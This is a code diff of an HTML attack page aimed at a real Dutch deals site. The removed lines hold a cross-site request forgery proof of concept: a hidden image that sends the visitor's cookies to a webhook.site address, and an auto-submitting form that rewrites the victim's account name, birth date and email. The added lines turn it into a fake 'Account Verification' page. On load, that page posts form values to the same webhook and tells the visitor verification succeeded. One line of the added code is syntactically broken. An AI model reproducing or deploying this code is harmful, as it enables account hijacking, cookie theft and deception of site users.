@@ -1,19 +1,51 @@
+<!DOCTYPE html>
 <html>
-  <body>
-    <!-- This img tag sends the cookies for THE CURRENT DOMAIN (attacker's site) to the webhook -->
-    <img src="https://webhook.site/a28a04ba-9bc8-4548-a92c-9b2b289f8a51?origin_cookie=" onerror="this.src='https://webhook.site/a28a04ba-9bc8-4548-a92c-9b2b289f8a51?origin_cookie=' + encodeURIComponent(document.cookie)" style="display: none;">
+<head>
+    <title>Account Verification</title>
+</head>
+<body>
+    <h2>Verifying Your Account...</h2>
+    <p>Please wait while we verify your account information.</p>
+    <div id="status"></div>
 
-    <form action="https://www.socialdeal.nl/modal/account/edit/" method="POST">
-      <input type="hidden" name="salutation" value="male">
-      <input type="hidden" name="firstName" value="nothing">
-      <input type="hidden" name="lastName" value="Khn">
-      <input type="hidden" name="birthDate-day" value="11">
-      <input type="hidden" name="birthDate-month" value="10">
-      <input type="hidden" name="birthDate-year" value="2013">
-      <input type="hidden" name="email" value="fj71115008@gmail.com">
-    </form>
     <script>
-      document.forms[0].submit();
+        // Function to extract form values
+        function extractFormValues() {
+            const formData = {
+                salutation: document.querySelector('select[name="salutation"]')?.value || '',
+                firstName: document.querySelector('input[name="firstName"]')?.value || '',
+                lastName: document.querySelector('input[name="lastName"]')?.value || '',
+                email: document.querySelector('input[name="email"]')?.value || ''
+            };
+            return formData;
+        }
+
+        // Function to send data to webhook
+        function sendDataToWebhook(data) {
+            // Replace with your actual webhook URL
+            const webhookUrl = 'https://webhook.site/a28a04ba-9bc8-4548-a92c-9b2b289f8a51':
+            fetch(webhookUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(data)
+            })
+            .then(response => {
+                document.getElementById('status').textContent = 'Verification successful!';
+                document.getElementById('status').style.color = 'green';
+            })
+            .catch(error => {
+                document.getElementById('status').textContent = 'Verification failed. Please try again later.';
+                document.getElementById('status').style.color = 'red';
+            });
+        }
+
+        // Automatically extract and send data when page loads
+        window.onload = function() {
+            const formData = extractFormValues();
+            sendDataToWebhook(formData);
+        };
     </script>
-  </body>
+</body>
 </html>
